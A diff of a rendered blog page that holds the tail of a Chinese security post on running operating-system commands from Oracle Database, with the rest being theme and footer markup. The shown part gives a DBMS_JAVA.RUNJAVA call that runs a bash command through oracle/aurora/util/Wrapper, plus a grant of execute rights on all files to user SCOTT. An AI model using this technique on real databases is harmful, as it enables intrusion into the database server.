-<h3 id="2-2-DBMS-JAVA-RUNJAVA"><a href="#2-2-DBMS-JAVA-RUNJAVA" class="headerlink" title="2.2 DBMS_JAVA.RUNJAVA"></a>2.2 DBMS_JAVA.RUNJAVA</h3><h4 id="2-2-1-执行的语句"><a href="#2-2-1-执行的语句" class="headerlink" title="2.2.1 执行的语句"></a>2.2.1 执行的语句</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> DBMS_JAVA.RUNJAVA(<span class="hljs-string">&#x27;oracle/aurora/util/Wrapper /bin/bash -c /bin/ls&gt;/tmp/OUT.LST&#x27;</span>) <span class="hljs-keyword">FROM</span> DUAL;<br></code></pre></td></tr></table></figure>
+<h3 id="2-2-DBMS-JAVA-RUNJAVA"><a href="#2-2-DBMS-JAVA-RUNJAVA" class="headerlink" title="2.2 DBMS_JAVA.RUNJAVA"></a>2.2 DBMS_JAVA.RUNJAVA</h3><h4 id="2-2-1-执行的语句"><a href="#2-2-1-执行的语句" class="headerlink" title="2.2.1 执行的语句"></a>2.2.1 执行的语句</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DBMS_JAVA.RUNJAVA(<span class="string">&#x27;oracle/aurora/util/Wrapper /bin/bash -c /bin/ls&gt;/tmp/OUT.LST&#x27;</span>) <span class="keyword">FROM</span> DUAL;</span><br></pre></td></tr></table></figure>
 
-<h4 id="2-2-2-需要的权限"><a href="#2-2-2-需要的权限" class="headerlink" title="2.2.2 需要的权限"></a>2.2.2 需要的权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>, <span class="hljs-string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="hljs-string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;execute&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<h4 id="2-2-2-需要的权限"><a href="#2-2-2-需要的权限" class="headerlink" title="2.2.2 需要的权限"></a>2.2.2 需要的权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> dbms_java.grant_permission(<span class="string">&#x27;SCOTT&#x27;</span>, <span class="string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="string">&#x27;execute&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
 <h4 id="2-2-3-受影响系统"><a href="#2-2-3-受影响系统" class="headerlink" title="2.2.3 受影响系统"></a>2.2.3 受影响系统</h4><p>10g R2, 11g R1, 11g R2</p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
@@ -384,338 +237,147 @@
 <li><a target="_blank" rel="noopener" href="http://media.blackhat.com/bh-us-10/whitepapers/Siddharth/BlackHat-USA-2010-Siddharth-Hacking-Oracle-from-the-Web-wp.pdf">Hacking Oracle from the Web</a></li>
 </ol>
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/Security/" class="print-no-link">#Security</a>
-      
-    </div>
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>Execute os command in Oracle Database</div>
-      <div>http://usmacd.com/cn/oracle_run_os_cmd/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>Author</div>
-          <div>henices</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>Posted on</div>
-          <div>September 6, 2023</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>Licensed under</div>
-          <div>
-            
-              
-              
-                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
-                    <i class="iconfont icon-by"></i>
-                  </span>
-                </a>
-              
-            
-          </div>
-        </div>
-      
-    </div>
-    <div class="license-icon iconfont"></div>
   </div>
+</article>
 
 
 
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/cn/other/" title="一些杂谈">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">一些杂谈</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/cn/oneplus3T_p3/" title="一加 (oneplus ) 3T 非root 开启 P3 色域">
-                        <span class="hidden-mobile">一加 (oneplus ) 3T 非root 开启 P3 色域</span>
-                        <span class="visible-mobile">Next</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
 
-            
-          </article>
-        </div>
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/links/">Links</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%AD%A3%E7%BB%9F%E6%96%B9%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">1. 正统方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E4%BD%BF%E7%94%A8JAVA"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 使用JAVA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-1-%E4%BB%A3%E7%A0%81"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1.1 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-2-%E8%AE%BE%E7%BD%AE%E8%BE%93%E5%87%BA"><span class="toc-number">1.1.2.</span> <span class="toc-text">1.1.2 设置输出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-3-%E9%9C%80%E8%A6%81%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">1.1.3.</span> <span class="toc-text">1.1.3 需要的权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-4-%E5%AE%9E%E9%AA%8C%E7%BB%93%E6%9E%9C"><span class="toc-number">1.1.4.</span> <span class="toc-text">1.1.4 实验结果</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-5-%E6%B3%A8%E6%84%8F"><span class="toc-number">1.1.5.</span> <span class="toc-text">1.1.5 注意</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-DBMS-SCHEDULAR"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 DBMS_SCHEDULAR</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-1-DBMS-SCHEDULAR-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.2.1 DBMS_SCHEDULAR 简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-2-%E9%9C%80%E8%A6%81%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">1.2.2 需要的权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-3-%E6%89%A7%E8%A1%8C%E7%9A%84%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.2.3.</span> <span class="toc-text">1.2.3 执行的语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-4-%E6%B3%A8%E6%84%8F"><span class="toc-number">1.2.4.</span> <span class="toc-text">1.2.4 注意</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E4%BD%BF%E7%94%A8oradebug"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 使用oradebug</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%9A%84%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">执行的语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F"><span class="toc-number">1.3.2.</span> <span class="toc-text">注意</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%BB%91%E5%AE%A2%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">2. 黑客方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-DBMS-JAVA-TEST-FUNCALL"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 DBMS_JAVA_TEST.FUNCALL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-%E6%89%A7%E8%A1%8C%E7%9A%84%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1 执行的语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-%E9%9C%80%E8%A6%81%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.1.2 需要的权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-3-%E5%8F%97%E5%BD%B1%E5%93%8D%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.1.3.</span> <span class="toc-text">2.1.3 受影响系统</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-DBMS-JAVA-RUNJAVA"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 DBMS_JAVA.RUNJAVA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-1-%E6%89%A7%E8%A1%8C%E7%9A%84%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 执行的语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-%E9%9C%80%E8%A6%81%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2 需要的权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-3-%E5%8F%97%E5%BD%B1%E5%93%8D%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.2.3.</span> <span class="toc-text">2.2.3 受影响系统</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
       </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://usmacd.com/cn/oracle_run_os_cmd/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://usmacd.com/cn/oracle_run_os_cmd/&text=Execute os command in Oracle Database"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://usmacd.com/cn/oracle_run_os_cmd/&title=Execute os command in Oracle Database"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://usmacd.com/cn/oracle_run_os_cmd/&is_video=false&description=Execute os command in Oracle Database"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Execute os command in Oracle Database&body=Check out this article: http://usmacd.com/cn/oracle_run_os_cmd/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://usmacd.com/cn/oracle_run_os_cmd/&title=Execute os command in Oracle Database"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://usmacd.com/cn/oracle_run_os_cmd/&title=Execute os command in Oracle Database"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://usmacd.com/cn/oracle_run_os_cmd/&title=Execute os command in Oracle Database"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://usmacd.com/cn/oracle_run_os_cmd/&title=Execute os command in Oracle Database"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://usmacd.com/cn/oracle_run_os_cmd/&name=Execute os command in Oracle Database&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://usmacd.com/cn/oracle_run_os_cmd/&t=Execute os command in Oracle Database"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
     </div>
 
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header">
-    <i class="iconfont icon-list"></i>
-    <span>Table of Contents</span>
-  </p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
     </div>
+
   </div>
 </div>
 
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
     
-
     
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
+    2004-2024
+    henices
   </div>
-</div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
 
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
     </div>
-  
-  
-  
-  
-</div>
+    <!-- styles -->
 
-  </footer>
 
-  <!-- Scripts -->
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
   
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
     })
+  })
   </script>
 
 
-<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+<script src="/js/main.js"></script>
 
+<!-- search -->
 
+<!-- Baidu Analytics -->
 
+<!-- Cloudflare Analytics -->
 
+<!-- Disqus Comments -->
 
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
+<!-- utterances Comments -->
 
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
-  </noscript>
 </body>
 </html>
